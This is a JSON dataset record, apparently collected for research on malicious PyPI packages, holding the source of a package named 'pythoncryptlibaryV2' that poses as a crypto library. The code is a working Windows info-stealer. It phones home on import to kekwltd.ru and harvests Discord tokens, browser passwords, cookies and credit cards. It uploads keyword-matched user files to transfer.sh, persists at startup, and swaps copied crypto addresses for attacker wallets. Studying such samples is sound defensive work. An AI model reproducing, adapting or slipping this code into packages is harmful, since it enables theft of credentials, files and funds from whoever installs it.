[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pythoncryptlibaryv2-1.0.0-py3-none-any/pythoncryptlibaryV2/__init__.py",
    "malicious_code": "import os\nimport requests\nimport httpx\nimport shutil\nimport threading\nimport subprocess\nimport sqlite3\nimport base64\nimport json\nimport ntpath\nimport re\nimport zipfile\nimport psutil\nimport pyperclip\nimport ctypes\nimport time\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious configuration and webhook ---\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay/bluescreen\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg': [ ... ]\n}\n\n# --- Malicious: Initial exfiltration on import ---\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://kekwltd.ru/relay/bluescreen\", json=data)\n\n# --- Malicious: Crypto wallet address swapper (clipboard hijacker) ---\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other crypto address regexes omitted for brevity)\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Malicious: Token, password, cookie, credit card, and file stealer ---\nclass bc_initial_func:\n    def __init__(self):\n        # ... (setup omitted for brevity)\n        self.discord_webhook = __config__['yourwebhookurl']\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        # ...\n    async def init(self):\n        # ...\n        self.error_remote()\n        self.startupkekw()\n        # ...\n        function_list = [self.steal_screen, self.system_informations, self.steal_token, self.grabb_mc, self.grabb_roblox]\n        # ...\n        for func in function_list:\n            process = threading.Thread(target=func, daemon=True)\n            process.start()\n        for t in threading.enumerate():\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n        self.natify_matched_tokens()\n        self.ping_on_running()\n        self.finished_bc()\n    def steal_token(self):\n        # ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            # ...\n            for filname in os.listdir(path):\n                if filname[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                    for token in re.findall(self.regex, line):\n                        try:\n                            r = requests.get(self.baseurl, headers={\n                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                'Content-Type': 'application/json',\n                                'Authorization': token})\n                        except Exception:\n                            pass\n                        if r.status_code == 200:\n                            uid = r.json()['id']\n                            if uid not in self.bc_id:\n                                self.tokens.append(token)\n                                self.bc_id.append(uid)\n        # ... (firefox and other browsers)\n    def steal_passwords2(self, name: str, path: str, profile: str):\n        # ...\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\n                url, username, password = res\n                password = self.dcrpt_val(password, self.masterkey)\n                if url != \"\":\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\n        # ...\n    def steal_cookies2(self, name: str, path: str, profile: str):\n        # ...\n        with open(os.path.join(self.dir, \"Browsers\", \"All Cookies.txt\"), 'a', encoding=\"utf-8\") as f:\n            for res in cursor.execute(\"SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies\").fetchall():\n                host_key, name, path, encrypted_value, expires_utc = res\n                value = self.dcrpt_val(encrypted_value, self.masterkey)\n                if host_key and name and value != \"\":\n                    f.write(\"{}\\t{}\\t{}\\t{}\\t{}\\t{}\\t{}\\n\".format(\n                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))\n        # ...\n    def steal_cc2(self, name: str, path: str, profile: str):\n        # ...\n        with open(os.path.join(self.dir, \"Browsers\", \"All Creditcards.txt\"), 'a', encoding=\"utf-8\") as f:\n            for res in cursor.execute(\"SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards\").fetchall():\n                name_on_card, expiration_month, expiration_year, card_number_encrypted = res\n                if name_on_card and card_number_encrypted != \"\":\n                    f.write(\n                        f\"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.dcrpt_val(card_number_encrypted, self.masterkey)}\\n\")\n        # ...\n    def finished_bc(self):\n        # ...\n        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        # ...\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# --- Malicious: File search and exfiltration from Desktop, Downloads, Documents ---\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    if name == \"bc_checking\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    LoadRequests(\"POST\", hook, files=files)\n\n# --- Malicious: Main execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    import asyncio\n    asyncio.run(bc_initial_func().init())\n\n# --- Malicious: Run file search and exfiltration, then start clipboard hijacker ---\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\ngrabb_GatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"bc_checking\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]